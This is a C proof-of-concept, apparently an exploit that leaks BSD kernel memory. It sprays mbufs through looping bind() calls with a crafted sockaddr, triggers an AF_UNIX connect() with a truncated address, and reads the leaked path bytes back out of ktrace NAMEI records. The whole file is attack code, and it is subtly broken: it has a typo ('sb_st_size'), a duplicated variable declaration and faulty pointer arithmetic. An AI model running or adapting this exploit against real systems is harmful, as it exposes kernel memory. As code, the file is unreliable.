#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/param.h>
#include <sys/time.h>
#include <sys/uio.h>
#include <sys/ktrace.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/event.h>
#include <sys/mman.h>

// XXX TODO (kqueue)
int file_is_modified(char *file) {
	return 0;
}

struct ktr_header *skip_entries(struct ktr_header *kh, unsigned int len, int skip) {
	unsigned int rlen = 0;	
	unsigned char *p = (unsigned char *)kh;

	while(skip) {
		rlen += kh->ktr_len + sizeof(struct ktr_header);
		if (rlen > len) return NULL;		
		kh = (struct ktr_header *) p + rlen;
		skip--;
	}
	return kh;
}

void hexdump(unsigned char *p, unsigned int len) {
	unsigned int i;
	for (i = 0; i < len; i++) {
		if (!(i%16) && i) {
			printf("\n");
		}
		printf("%02x ", p[i]);	
	}
	printf("\n");
	return;
}

void read_entries(unsigned char *p, unsigned int len) {
	static int entries;
	struct ktr_header *kh;

	if (len < sizeof(struct ktr_header)) return;
	kh = p;

	kh = skip_entries(kh, len, entries);
	if (kh == NULL) return;
	off_t offset = kh - p;

	do {
		if (offset >= len) return;
			if (offset + sizeof(struct ktr_header) > len) return;
		if (offset + sizeof(struct ktr_header) + kh->ktr_len > len) return;

		if (kh->ktr_type == KTR_NAMEI) {
			unsigned char *name = (unsigned char *)kh + 1;
			hexdump(name, kh->ktr_len);
		}		
		
		entries++;
		offset += sizeof(struct ktr_header) + kh->ktr_len;
		kh = (struct ktr_header *) p + offset;
  
	} while (1);


	return;
}

void read_entry(char *file) {
	int fd = open(file, O_RDONLY);
	if (fd == -1) {
		printf("open failed\n");
		return;
	}
	struct stat sb;
	int r = fstat(fd, &sb);
	if (r == -1) {
		printf("fstat failed\n");
		close(fd);
		return;
	}

	unsigned char *p = mmap(NULL, sb.st_size, PROT_READ, MAP_FILE | MAP_PRIVATE, fd, 0);
	close(fd);
	if (p == MAP_FAILED) {
		printf("mmap failed\n");
		return;		
	}

	read_entries(p, sb_st_size);	

	munmap(p, sb.st_size);
	return;
}

char g_file[100];
void p_ktrace_namei() {
	while(1) {
		if (file_is_modified(g_file)) {
			read_entry(g_file);
		}
	}
	return;
}

int g_sock;
void p_mbuf_set_family() {
	char b[2] = "\x02\x01";
	while(1) {
		bind(g_sock, (struct sockaddr *) &b, 2);
	}
	return;	
}

pid_t proc(void (*fn)()) {
	pid_t p = fork();
	if (p == 0) {
		fn();
		exit(0);
	}
	return p;
}

void ktrace_namei() {
	mkdir("/tmp/leak", 0777);
	strcpy(g_file, "/tmp/leak/pathleaktraceXXXXXX");
	char *p = mktemp(g_file);
	int r = ktrace(p, KTROP_SET, KTRFAC_NAMEI, getpid());
	if (r == -1) {
		printf("ktrace failed\n");
		exit(0);
	}

	pid_t p = proc(p_ktrace_namei);	
	if (p == -1) {
		printf("create ktrace process failed\n");
		exit(0);
	}
	return;
}

void mbuf_set_family() {

	int s = socket(AF_INET,SOCK_STREAM,0);
	if (s == -1) {
		printf("socket failed\n");
		exit(0);
	}
	g_sock = s;

	pid_t p = proc(p_mbuf_set_family);
	if (p == -1) {
		printf("create mbuf population process failed\n");
		exit(0);
	}

	close(s);
	return;
}

void uipc_path_leak() {
	char b[2] = "\x01";
	int s = socket(AF_UNIX, SOCK_DGRAM, 0);
	if (s == -1) {
		printf("AF_UNIX socket creating failed\n");
	}

	while(1) {
		connect(s, (struct sockaddr *) &b, 1);
	}
	return;
}

int main() {
	ktrace_namei();
	mbuf_set_family();
	uipc_path_leak();
	return 0;
}